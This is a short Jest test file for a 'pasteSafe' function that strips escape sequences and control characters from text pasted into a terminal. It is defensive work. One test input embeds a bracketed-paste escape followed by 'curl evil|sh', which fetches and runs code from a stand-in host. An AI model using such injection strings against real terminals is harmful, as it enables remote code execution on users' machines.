import { pasteSafe } from './paste-text';

describe('pasteSafe', () => {
  it('cannot end bracketed paste or send escape sequences', () => {
    expect(pasteSafe('a\u001b[201~curl evil|sh\nb')).toBe('a[201~curl evil|sh\nb');
    expect(pasteSafe('\u001b[200~x\u009b31m')).toBe('[200~x31m');
  });

  it('keeps text, tabs, line breaks and non-ASCII characters', () => {
    const text = 'ls -la\tfoo\r\ncd "é ü 中文 🙂"\n';
    expect(pasteSafe(text)).toBe(text);
  });

  it('drops other control characters', () => {
    expect(pasteSafe('a\u0003b\u0004c\u007fd\u0000')).toBe('abcd');
  });
});
